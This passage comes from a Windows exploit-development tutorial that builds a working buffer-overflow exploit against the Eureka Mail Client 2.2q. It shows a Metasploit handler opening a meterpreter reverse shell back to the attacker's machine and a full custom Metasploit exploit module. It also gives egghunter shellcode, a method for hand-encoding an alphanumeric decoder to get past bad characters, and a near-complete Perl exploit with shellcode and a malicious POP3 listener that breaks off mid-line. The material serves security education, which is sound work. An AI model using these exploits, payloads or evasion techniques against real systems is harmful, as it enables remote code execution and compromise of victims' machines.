)\\\n||--|| *\n=[ metasploit v3.3.4-dev [core:3.3 api:1.0]\n+ -- --=[ 490 exploits - 227 auxiliary\n+ -- --=[ 192 payloads - 23 encoders - 8 nops\n=[ svn r8091 updated today (2010.01.09)\nmsf > use exploit\/multi\/handler\nmsf exploit(handler) > set PAYLOAD windows\/meterpreter\/reverse_tcp\nPAYLOAD => windows\/meterpreter\/reverse_tcp\nmsf exploit(handler) > set LPORT 4444\nLPORT => 4444\nmsf exploit(handler) > set LHOST 192.168.0.122\nLHOST => 192.168.0.122\nmsf exploit(handler) > show options\nModule options:\nName  Current Setting  Required  Description\n----  ---------------  --------  -----------\nPayload options (windows\/meterpreter\/reverse_tcp):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nEXITFUNC  process          yes       Exit technique: seh, thread, process\nLHOST     192.168.0.122    yes       The local address\nLPORT     4444             yes       The local port\nExploit target:\nId  Name\n--  ----\n0   Wildcard Target\nmsf exploit(handler) > exploit\n[*] Starting the payload handler...\n[*] Started reverse handler on port 4444\nNow run the exploit and trigger the overflow with Eureka. After a few\nseconds, you should see this :\n[*] Sending stage (723456 bytes)\n[*] Meterpreter session 1 opened (192.168.0.122:4444 -> 192.168.0.193:15577)\nmeterpreter >\nowned !\nImplementing egg hunters in Metasploit\nLet\u2019s convert our Eureka Mail Client egghunter exploit to a metasploit\nmodule.  You can find some information on how exploit modules can be\nported on the Metasploit wiki :\n[80]http:\/\/www.metasploit.com\/redmine\/projects\/framework\/wiki\/PortingEx\nploits\nSome facts before we begin :\n\u2013 we will need to set up a server (POP3, listener on port 110)\n\u2013 we will need to calculate the correct offset. We\u2019ll use the SRVHOST\nparameter for this\n\u2013 we\u2019ll assume that the client is using XP SP3 (you can add more if you\ncan get hold of the correct trampoline addresses for other Service\nPacks)\nNote : the original metasploit module for this vulnerability is already\npart of Metasploit (see the exploits\/windows\/misc folder, and look for\neureka_mail_err.rb). We\u2019ll just make our own module.\nOur custom metasploit module could look something like this :\nclass Metasploit3 < Msf::Exploit::Remote\nRank = NormalRanking\ninclude Msf::Exploit::Remote::TcpServer\ninclude Msf::Exploit::Egghunter\ndef initialize(info = {})\nsuper(update_info(info,\n'Name'           => 'Eureka Email 2.2q ERR Remote Buffer Overflow Exploit\n',\n'Description'    => %q{\nThis module exploits a buffer overflow in the Eureka Email 2.2q\nclient that is triggered through an excessively long ERR message.\n},\n'Author'         =>\n[\n'Peter Van Eeckhoutte (a.k.a corelanc0d3r)'\n],\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'process',\n},\n'Payload'        =>\n{\n'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n'StackAdjustment' => -3500,\n'DisableNops' => true,\n},\n'Platform'       => 'win',\n'Targets'        =>\n[\n[ 'Win XP SP3 English', { 'Ret' => 0x7E47BCAF } ], # jmp esp \/ user\n32.dll\n],\n'Privileged'     => false,\n'DefaultTarget'  => 0))\nregister_options(\n[\nOptPort.new('SRVPORT', [ true, \"The POP3 daemon port to listen on\", 1\n10 ]),\n], self.class)\nend\ndef on_client_connect(client)\nreturn if ((p = regenerate_payload(client)) == nil)\n# the offset to eip depends on the local ip address string length...\noffsettoeip=723-datastore['SRVHOST'].length\n# create the egg hunter\nhunter = generate_egghunter\n# egg\negg = hunter[1]\nbuffer =  \"-ERR \"\nbuffer << make_nops(offsettoeip)\nbuffer << [target.ret].pack('V')\nbuffer << hunter[0]\nbuffer << make_nops(1000)\nbuffer << egg + egg\nbuffer << payload.encoded + \"\\r\\n\"\nprint_status(\" [*] Sending exploit to #{client.peerhost}...\")\nprint_status(\" Offset to EIP : #{offsettoeip}\")\nclient.put(buffer)\nclient.put(buffer)\nclient.put(buffer)\nclient.put(buffer)\nclient.put(buffer)\nclient.put(buffer)\nhandler\nservice.close_client(client)\nend\nend\nOf course, if you want to use your own custom egg hunter (instead of\nusing the one built into Metasploit \u2013 which uses the\nNtDisplayString\/NtAccessCheckAndAuditAlarm technique to search memory\nby the way), then you can also write the entire byte code manually in\nthe exploit.\nExploit : (192.168.0.193 = client running Eureka, configured to connect\nto 192.168.0.122 as POP3 server.    192.168.0.122 = metasploit machine)\nI have placed the metasploit module under exploit\/windows\/eureka (new\nfolder)\nTest :\n# # ###### ##### ## #### ##### # #### # #####\n## ## # # # # # # # # # # # #\n# ## # ##### # # # #### # # # # # # #\n# # # # ###### # ##### # # # # #\n# # # # # # # # # # # # # #\n# # ###### # # # #### # ###### #### # #\n=[ metasploit v3.3.4-dev [core:3.3 api:1.0]\n+ -- --=[ 493 exploits - 232 auxiliary\n+ -- --=[ 192 payloads - 23 encoders - 8 nops\n=[ svn r8137 updated today (2010.01.15)\nmsf > use exploit\/windows\/eureka\/corelan_eureka2\nmsf exploit(corelan_eureka2) > set payload windows\/exec\npayload => windows\/exec\nmsf exploit(corelan_eureka2) > set SRVHOST 192.168.0.122\nSRVHOST => 192.168.0.122\nmsf exploit(corelan_eureka2) > set CMD calc\nCMD => calc\nmsf exploit(corelan_eureka2) > exploit\n[*] Exploit running as background job.\nmsf exploit(corelan_eureka2) >\n[*] Server started.\n[*]  [*] Sending exploit to 192.168.0.193...\n[*]      Offset to EIP : 710\n[*] Server stopped.\nConnect the Eureka Mail client to 192.168.0.122 :\n[81]image\nOther payloads :\nbindshell on port 55555 :\n[82]image\nBadchars + Encoding\nUsing Metasploit\nEgghunter code is just like regular shellcode. It is susceptible to\ncorruption in memory, it may be subject to bad chars, etc.  So if you\nare getting weird errors during egghunter execution, it may be a good\nidea to compare the original code with what you have in memory and\nsearch for bad chars. (I have explained a technique to compare code\n(whether it\u2019s the egg hunter itself or shellcode \u2013 same technique\napplies) earlier in this document).\nWhat if you have discovered that the code was corrupted ?\nAlternative encoding may be required to make the egg hunter work,\nand\/or a \u201cbad char\u201d filter may be required to filter out characters\nthat get corrupted or converted in memory and would break the code.\nAlso, keep in mind that the type of encoding & badchars to filter *may*\nbe entirely different between what is applicable to the final shellcode\nand what is applicable to the egg hunter. It won\u2019t happen a lot of\ntimes, but it is possible. So you may want to run the exercise on both\nthe hunter and the shellcode.\nEncoding the egg hunter (or any shellcode) is quite simple.  Just write\nthe egghunter to a file, encode the file, and use the encoded byte code\noutput as your egg hunter payload.  Whether you\u2019ll have to include the\ntag before encoding or not depends on the bad chars, but in most cases\nyou should not include it.  After all, if the tag is different after\nencoding, you also need to prepend the shellcode with the modified\ntag\u2026  You\u2019ll have to put the egg hunter in a debugger and see what\nhappened to the tag.\nExample : Let\u2019s say the egg hunter needs to be alphanumerical\n(uppercase) encoded, and you have included the tag in the eggfile, then\nthis will be the result :\nroot@xxxxx:\/pentest\/exploits\/trunk# cat writeegghunter.pl\n#!\/usr\/bin\/perl\n# Write egghunter to file\n# Peter Van Eeckhoutte\n#\nmy $eggfile = \"eggfile.bin\";\nmy $egghunter = \"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x7\n4\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # this is the marker\/tag: w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\nopen(FILE,\">$eggfile\");\nprint FILE $egghunter;\nclose(FILE);\nprint \"Wrote \".length($egghunter).\" bytes to file \".$eggfile.\"\\n\";\nroot@xxxxx:\/pentest\/exploits\/trunk# perl writeegghunter.pl\nWrote 32 bytes to file eggfile.bin\nroot@xxxxx:\/pentest\/exploits\/trunk# .\/msfencode -e x86\/alpha_upper -i eggfile.bi\nn -t perl\n[*] x86\/alpha_upper succeeded with size 132 (iteration=1)\nmy $buf =\n\"\\x89\\xe0\\xda\\xc0\\xd9\\x70\\xf4\\x5a\\x4a\\x4a\\x4a\\x4a\\x4a\\x43\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x52\\x59\\x56\\x54\\x58\\x33\\x30\\x56\\x58\" .\n\"\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\\x42\" .\n\"\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\" .\n\"\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x43\\x56\\x4d\\x51\" .\n\"\\x49\\x5a\\x4b\\x4f\\x44\\x4f\\x51\\x52\\x46\\x32\\x43\\x5a\\x44\\x42\" .\n\"\\x50\\x58\\x48\\x4d\\x46\\x4e\\x47\\x4c\\x43\\x35\\x51\\x4a\\x42\\x54\" .\n\"\\x4a\\x4f\\x4e\\x58\\x42\\x57\\x46\\x50\\x46\\x50\\x44\\x34\\x4c\\x4b\" .\n\"\\x4b\\x4a\\x4e\\x4f\\x44\\x35\\x4b\\x5a\\x4e\\x4f\\x43\\x45\\x4b\\x57\" .\n\"\\x4b\\x4f\\x4d\\x37\\x41\\x41\";\nLook at the output in $buf : your tag must be out there, but where is\nit ? has it been changed or not ? will this encoded version work ?\nTry it. Don\u2019t be disappointed if it doesn\u2019t, and read on.\nHand-crafting the encoder\nWhat if there are too many constraints and, Metasploit fails to encode\nyour shellcode ?  (egg hunter = shellcode, so this applies to all\nshapes and forms of shellcode in general)\nWhat if, for example, the list of bad chars is quite extensive, what if\n\u2013 on top of that \u2013 the egg hunter code should be alphanumeric only\u2026\nWell, you\u2019ll have to handcraft the encoder yourself.  In fact, just\nencoding the egg hunter (including the tag) will not work out of the\nbox. What we really need is a decoder that will reproduce the original\negg hunter (including the tag) and then execute it.\nThe idea behind this chapter was taken from [83]a beautiful exploit\nwritten by muts. If you look at this exploit, you can see a somewhat\n\u201cspecial\u201d egghunter.\negghunter=(\n\"%JMNU%521*TX-1MUU-1KUU-5QUUP\\AA%J\"\n\"MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5\"\n\"21*-q!au-q!au-oGSePAA%JMNU%521*-D\"\n\"A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1\"\n\"z1E-oRHEPAA%JMNU%521*-3s1--331--^\"\n\"TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA\"\n\"A%JMNU%521*-R222-1111-nZJ2PAA%JMN\"\n\"U%521*-1-wD-1-wD-8$GwP\")\nThe exploit code also states : \u201cAlphanumeric egghunter shellcode +\nrestricted chars \\x40\\x3f\\x3a\\x2f\u201d. So it looks like the exploit only\ncan be triggered using printable ascii characters (alphanumeric) (which\nis not so uncommon for a web server\/web application)\nWhen you convert this egghunter to asm, you see this : (just the first\nfew lines are shown)\n25 4A4D4E55      AND EAX,554E4D4A\n25 3532312A      AND EAX,2A313235\n54               PUSH ESP\n58               POP EAX\n2D 314D5555      SUB EAX,55554D31\n2D 314B5555      SUB EAX,55554B31\n2D 35515555      SUB EAX,55555135\n50               PUSH EAX\n41               INC ECX\n41               INC ECX\n25 4A4D4E55      AND EAX,554E4D4A\n25 3532312A      AND EAX,2A313235\n2D 21555555      SUB EAX,55555521\n2D 21545555      SUB EAX,55555421\n2D 496F556D      SUB EAX,6D556F49\n50               PUSH EAX\n41               INC ECX\n41               INC ECX\n25 4A4D4E55      AND EAX,554E4D4A\n25 3532312A      AND EAX,2A313235\n2D 71216175      SUB EAX,75612171\n2D 71216175      SUB EAX,75612171\n2D 6F475365      SUB EAX,6553476F\nwow \u2013 that doesn\u2019t look like the egg hunter we know, does it ?\nLet\u2019 see what it does. The first 4 instructions empty EAX (2 logical\nAND operations) and the pointer in ESP is put on the stack (which\npoints to the beginning of the encoded egghunter).  Next, this value is\npopped into EAX. So EAX effectively points to the beginning of the\negghunter after these 4 instructions :\n25 4A4D4E55      AND EAX,554E4D4A\n25 3532312A      AND EAX,2A313235\n54               PUSH ESP\n58               POP EAX\nNext, the value in EAX is changed (using a series of SUB instructions).\nThen the new value in EAX is pushed onto the stack, and ECX is\nincreased with 2 :\n2D 314D5555      SUB EAX,55554D31\n2D 314B5555      SUB EAX,55554B31\n2D 35515555      SUB EAX,55555135\n50               PUSH EAX\n41               INC ECX\n41               INC ECX\n(The value that is calculated in EAX is going to be important later on\n!  I\u2019ll get back to this in a minute)\nThen, eax is cleared again (2 AND operations), and using the 3 SUB\ninstructions on EAX, a value is pushed onto the stack.\n[84]image\nSo before SUB EAX,55555521 is run, EAX = 00000000.  When the first SUB\nran, EAX contains AAAAAADF. After the second sub, EAX contains\n555556BE, and after the third SUB, eax contains E7FFE775.  Then, this\nvalue is pushed onto the stack.\nWait a minute. This value looks familiar to me. 0xE7, 0xFF, 0xE7, 0x75\nare in fact the last 4 bytes of the NtAccessCheckAndAuditAlarm egg\nhunter (in reversed order).  Nice.\nIf you continue to run the code, you\u2019ll see that it will reproduce the\noriginal egg hunter. (but in my testcase, using a different exploit,\nthe code does not work)\nAnyways, the code muts used is in fact an encoder that will reproduce\nthe original egg hunter, put it on the stack, and will run the\nreproduced code, effectively bypassing bad char limitations (because\nthe entire custom made encoder did not use any of the bad chars.)\nSimply genial !  I had never seen an implementation of this encoder\nbefore this particular exploit was published. Really well done muts !\nOf course, if the AND, PUSH, POP, SUB, INC opcodes are in the list of\nbadchars as well, then you may have a problem, but you can play with\nthe values for the SUB instructions in order to reproduce the original\negg hunter, keep track of the current location where the egghunter is\nreproduced (on the stack) and finally \u201cjump\u201d to it.\nHow is the jump made ?\nIf you have to deal with a limited character set (only alphanumerical\nascii-printable characters allowed for example), then a jmp esp, or\npush esp+ret, \u2026 won\u2019t work because these instructions may invalid\ncharacters. If you don\u2019t have to deal with these characters, then\nsimply add a jump at the end of the encoded hunter and you\u2019re all set.\nLet\u2019s assume that the character set is limited, so we must find another\nway to solve this  Remember when I said earlier that certain\ninstructions were going to be important ?  Well this is where it will\ncome into play. If we cannot make the jump, we need to make sure the\ncode starts executing automatically. The best way to do this is by\nwriting the decoded egg hunter right after the encoded code\u2026 so when\nthe encoded code finished reproducing the original egg hunter, it would\nsimply start executing this reproduced egg hunter.\nThat means that a value must be calculated, pointing to a location\nafter the encoded hunter, and this value must be put in ESP before\nstarting to decode. This way, the decoder will rebuild the egg hunter\nand place it right after the encoded hunter.  We\u2019ll have a closer look\nat this in the next chapter.\nSeeing this code run and reproduce the original egghunter is nice, but how\ncan you build your own decoder ?\nThe framework for building the encoded egghunter (or decoder if that\u2019s\nwhat you want to call it) looks like this :\n\u2013 set up the stack & registers (calculate where the decoded hunter must\nbe written. This will be the local position + length of the encoded\ncode (which will be more or less the same size). Calculating where the\ndecoder must be written to requires you to evaluate the registers when\nthe encoded hunter would start running. If you have made your way to\nthe encoded hunter via a jmp esp, then esp will contain the current\nlocation, and you can simply increase the value until it points to the\nright location. )\n\u2013 reproduce each 4 bytes of the original egg hunter on the stack, right\nafter the encoded hunter (using 2 AND\u2019s to clear out EAX, 3 SUBs to\nreproduce the original bytes, and a PUSH to put the reproduced code on\nthe stack)\n\u2013 When all bytes have been reproduced, the decoded egg hunter should\nkick in.\nFirst, let\u2019s build the encoder for the egghunter itself.  You have to\nstart by grouping the egg hunter in sets of 4 bytes. We have to start\nwith the last 4 bytes of the code (because we will push values to the\nstack each time we reproduce the original code\u2026 so at the end, the\nfirst bytes will be on top) Our NtAccessCheckAndAuditAlarm egg hunter\nis 32 bytes, so that\u2019s nicely aligned.  But if it\u2019s not aligned, you\ncan add more bytes (nops) to the bottom of the original egg hunter, and\nstart bottom up, working in 4 byte groups.\n\\x66\\x81\\xCA\\xFF\n\\x0F\\x42\\x52\\x6A\n\\x02\\x58\\xCD\\x2E\n\\x3C\\x05\\x5A\\x74\n\\xEF\\xB8\\x77\\x30   ;w0\n\\x30\\x74\\x8B\\xFA   ;0t\n\\xAF\\x75\\xEA\\xAF\n\\x75\\xE7\\xFF\\xE7\nThe code used by muts will effectively reproduce the egghunter (using\nW00T as tag). After the code has run, this is what is pushed on the\nstack :\n[85]image\nNice.\n2 questions remain however : how do we jump to that egg hunter now, and\nwhat if you have to write the encoded egg hunter yourself ?  Let\u2019s look\nat how it\u2019s done :\nSince we have 8 lines of 4 bytes of egg hunter code, you will end up\nwith 8 blocks of encoded code. The entire code should only using\nalphanumeric ascii-printable characters, and should not use any of the\nbad chars.  (check [86]http:\/\/www.asciitable.com\/)  The first printable\nchar starts at 0x20 (space) or 0x21, and ends at 7E\nEach block is used to reproduce 4 bytes of egg hunter code, using SUB\ninstructions. The way to calculate the values to use in the SUB\ninstructions is this :\ntake one line of egg hunter code, reverse the bytes !, and get its 2\u2019s\ncomplement (take all bits, invert them, and add one) (Using Windows\ncalculator, set it to hex\/dword, and calculate \u201c0 \u2013 value\u201d). For the\nlast line of the egg hunter code (0x75E7FFE7 -> 0xE7FFE775) this would\nbe 0x1800188B (= 0 \u2013 E7FFE775).\nThen find 3 values that only use alphanumeric characters\n(ascii-printable), and are not using any of the bad chars\n(\\x40\\x3f\\x3a\\x2f)\u2026 and when you sum up these 3 values, you should end\nup at the 2\u2019s complement value (0x1800188B in case of the last line)\nagain.  (by the way, thanks ekse for working with me finding the values\nin the list below :-) That was fun !)\nThe resulting 3 values are the ones that must be used in the sub,eax\ninstructions.\nSince bytes will be pushed to the stack, you have to start with the\nlast line of the egg hunter first (and don\u2019t forget to reverse the\nbytes of the code), so after the last push to the stack, the first\nbytes of the egg hunter would be located at ESP.\nIn order to calculate the 3 values, I usually do this :\n\u2013 calculate the 2\u2019s complement of the reversed bytes\n\u2013 start with the first bytes in the 2\u2019s complement. (18 in this case),\nand look for 3 values that, when you add them together, they will sum\nup to 18.  You may have to overflow in order to make it work (because\nyou are limited to ascii-printable characters).  So simply using\n06+06+06 won\u2019t work as 06 is not a valid character.  In that case, we\nneed to overflow and go to 118.  I usually start by taking a value\nsomewhere between 55 (3 times 55 = 0 again)  and 7F (last character).\nTake for example 71.  Add 71 to 71 = E2.  In order to get from E2 to\n118, we need to add 36, which is a valid character, so we have found\nour first bytes (see red).  This may not be the most efficient method\nto do this, but it works.  (Tip : windows calc : type in the byte value\nyou want to get to, divide it by 3 to know in what area you need to\nstart looking)\nThen do the same for the next 3 bytes in the 2\u2019s complement.  Note : if\nyou have to overflow to get to a certain value, this may impact the\nnext bytes.  Just add the 3 values together at the end, and if you had\nan overflow, you have to subtract one again from one of the next bytes\nin one of the 3 values.  Just try, you\u2019ll see what I mean.  (and you\nwill find out why the 3rd value starts with 35 instead of 36)\nLast line of the (original) egg hunter :\nx75 xE7 xFF xE7 -> xE7 xFF xE7 x75: (2\u2019s complement : 0x1800188B)\n-----------------------------------------------------------------\nsub eax, 0x71557130     (=> \"\\x2d\\x30\\x71\\x55\\x71\")  (Reverse again !)\nsub eax, 0x71557130     (=> \"\\x2d\\x30\\x71\\x55\\x71\")\nsub eax, 0x3555362B     (=> \"\\x2d\\x2B\\x36\\x55\\x35\")\n=> sum of these 3 values is 0x11800188B  (or 0x1800188B in dword)\nLet\u2019s look at the other ones.  Second last line of the (original) egg\nhunter :\nxAF x75 xEA xAF -> xAF xEA x75 xAF: (2\u2019s complement : 0x50158A51)\n-----------------------------------------------------------------\nsub eax, 0x71713071\nsub eax, 0x71713071\nsub eax, 0x6D33296F\nand so on\u2026\nx30 x74 x8B xFA -> xFA x8B x74 x30: (2\u2019s complement : 0x05748BD0)\n-----------------------------------------------------------------\nsub eax, 0x65253050\nsub eax, 0x65253050\nsub eax, 0x3B2A2B30\nxEF xB8 x77 x30 -> x30 x77 xB8 xEF: (2\u2019s complement : 0xCF884711)\n-----------------------------------------------------------------\nsub eax, 0x41307171\nsub eax, 0x41307171\nsub eax, 0x4D27642F\nx3C x05 x5A x74  -> x74 x5A x05 x3C: (2\u2019s complement : 0x8BA5FAC4)\n------------------------------------------------------------------\nsub eax, 0x30305342\nsub eax, 0x30305341\nsub eax, 0x2B455441\nx02 x58 xCD x2E -> x2E xCD x58 x02: (2\u2019s complement : 0xD132A7FE)\n-----------------------------------------------------------------\nsub eax, 0x46663054\nsub eax, 0x46663055\nsub eax, 0x44664755\nx0F x42 x52 x6A -> x6A x52 x42 x0F: (2\u2019s complement : 0x95ADBDF1)\n-----------------------------------------------------------------\nsub eax, 0x31393E50\nsub eax, 0X32393E50\nsub eax, 0x323B4151\nFinally, the first line :\nx66 x81 xca xff -> xff xca x81 x66 (2\u2019s complement : 0x00357E9A)\n----------------------------------------------------------------\nsub eax, 0x55703533\nsub eax, 0x55702533\nsub eax, 0x55552434\nEach of these blocks must be prepended with code that would zero-out\nEAX :\nExample :\nAND EAX,554E4D4A   (\"\\x25\\x4A\\x4D\\x4E\\x55\")\nAND EAX,2A313235   (\"\\x25\\x35\\x32\\x31\\x2A\")\n(2 times 5 bytes)\nEach block must be followed by a push eax (one byte, \u201c\\x50\u201d)\ninstruction which will put the result (one line of egg hunter code) on\nthe stack. Don\u2019t forget about it, or your decoded egg hunter won\u2019t be\nplaced on the stack.\nSo : each block will be 10 (zero eax) + 15 (decode) +1 (push eax) = 26\nbytes. We have 8 blocks, so we have 208 bytes already.\nNote, when converting the sub eax, instructions to opcode, don\u2019t\nforget to reverse the bytes of the values again\u2026  so sub\neax,0x476D556F would become \u201c\\x2d\\x6f\\x55\\x6d\\x47\u201d\nThe next thing that we need to do is make sure that the decoded egg\nhunter will get executed after it was reproduced.\nIn order to do so, we need to write it in a predictable location and\njump to it, or we need to write it directly after the encoded hunter so\nit gets executed automatically.\nIf we can write in a predictable location (because we can modify ESP\nbefore the encoded hunter runs), and if we can jump to the beginning of\nthe decoded hunter (ESP) after the encoded hunter has completed, then\nthat will work fine.\nOf course, if you character set is limited, then you may not be able to\nadd a \u201cjmp esp\u201d or \u201cpush esp\/ret\u201d or anything like that at the end of\nthe encoded hunter.    If you can \u2013 then that\u2019s good news.\nIf that is not possible, then you will need to write the decoded egg\nhunter right after the encoded version.  So when the encoded version\nstopped reproducing the orginal code, it would start executing it.  In\norder to do this, we must calculate where we should write the decoded\negg hunter to.  We know the number of bytes in the encoded egg hunter,\nso we should try to modify ESP accordingly (and do so before the\ndecoding process begins) so the decoded bytes would be written directly\nafter the encoded hunter.\nThe technique used to modify ESP depends on the available character\nset.  If you can only use ascii-printable characters, then you cannot\nuse add or sub or mov operations\u2026  One method that may work is running\na series of POPAD instructions to change ESP and make it point below\nthe end of the encoded hunter.  You may have to add some nops at the\nend of the encoded hunter, just to be on the safe side.  (\\x41 works\nfine as nop when you have to use ascii-printable characters only)\nWrap everything up, and this is what you\u2019ll get :\nCode to modify ESP (popad) + Encoded hunter (8 blocks : zero out eax,\nreproduce code, push to stack) + some nops if necessary\u2026\nWhen we apply this technique to the Eureka Mail Client exploit, we get\nthis :\nuse Socket;\n#fill out the local IP or hostname\n#which is used by Eureka EMail as POP3 server\n#note : must be exact match !\nmy $localserver = \"192.168.0.193\";\n#calculate offset to EIP\nmy $junk = \"A\" x (723 - length($localserver));\nmy $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll\nmy $padding = \"\\x90\" x 1000;\n#alphanumeric ascii-printable encoded + bad chars\n# tag = w00t\nmy $egghunter =\n#popad - make ESP point below the encoded hunter\n\"\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\".\n#-----8 blocks encoded hunter---------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x30\\x71\\x55\\x71\".   #x75 xE7 xFF xE7\n\"\\x2d\\x30\\x71\\x55\\x71\".\n\"\\x2d\\x2B\\x36\\x55\\x35\".\n\"\\x50\".                   #push eax\n#--------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x71\\x30\\x71\\x71\".   #xAF x75 xEA xAF\n\"\\x2d\\x71\\x30\\x71\\x71\".\n\"\\x2d\\x6F\\x29\\x33\\x6D\".\n\"\\x50\".                   #push eax\n#--------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x50\\x30\\x25\\x65\".   #x30 x74 x8B xFA\n\"\\x2d\\x50\\x30\\x25\\x65\".\n\"\\x2d\\x30\\x2B\\x2A\\x3B\".\n\"\\x50\".                   #push eax\n#---------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x71\\x71\\x30\\x41\".   #xEF xB8 x77 x30\n\"\\x2d\\x71\\x71\\x30\\x41\".\n\"\\x2d\\x2F\\x64\\x27\\x4d\".\n\"\\x50\".                   #push eax\n#---------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x42\\x53\\x30\\x30\".   #x3C x05 x5A x74\n\"\\x2d\\x41\\x53\\x30\\x30\".\n\"\\x2d\\x41\\x54\\x45\\x2B\".\n\"\\x50\".                   #push eax\n#---------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x54\\x30\\x66\\x46\".   #x02 x58 xCD x2E\n\"\\x2d\\x55\\x30\\x66\\x46\".\n\"\\x2d\\x55\\x47\\x66\\x44\".\n\"\\x50\".                   #push eax\n#---------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x50\\x3e\\x39\\x31\".   #x0F x42 x52 x6A\n\"\\x2d\\x50\\x3e\\x39\\x32\".\n\"\\x2d\\x51\\x41\\x3b\\x32\".\n\"\\x50\".                   #push eax\n#----------------------------\n\"\\x25\\x4A\\x4D\\x4E\\x55\".   #zero eax\n\"\\x25\\x35\\x32\\x31\\x2A\".   #\n\"\\x2d\\x33\\x35\\x70\\x55\".   #x66 x81 xCA xFF\n\"\\x2d\\x33\\x25\\x70\\x55\".\n\"\\x2d\\x34\\x24\\x55\\x55\".\n\"\\x50\".                   #push eax\n#------------------------------\n\"\\x41\\x41\\x41\\x41\";       #some nops\n#calc.exe\nmy $shellcode=\"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nmy $payload=$junk.$ret.$egghunter.$padding.\"w00tw00t\".$shellcode;\n#set up listener on port 110\nmy $port=110;\nmy $proto=getprotobyname('tcp');\nsocket(SERVER,PF_INET,SOCK_STREAM,$proto);\nmy $paddr=sockaddr_in($port,INADDR_ANY);\nbind(SERVER,$paddr);\nlisten(SERVER,SOMAXCONN);\nprint \"[+] Listening on tcp port 110 [POP3]... \\n\";\nprint \"[+] Configure Eureka Mail Client to connect to this host\\n\";\nmy $client_addr;\nwhile($client_addr=accept(CLIENT,SERVER))\n{\nprint \"[+] Client connected, sending evil payload\\n\";\nmy $cnt=1;\nwhile($cnt<10)\n{\nprint CLIENT \"-ERR 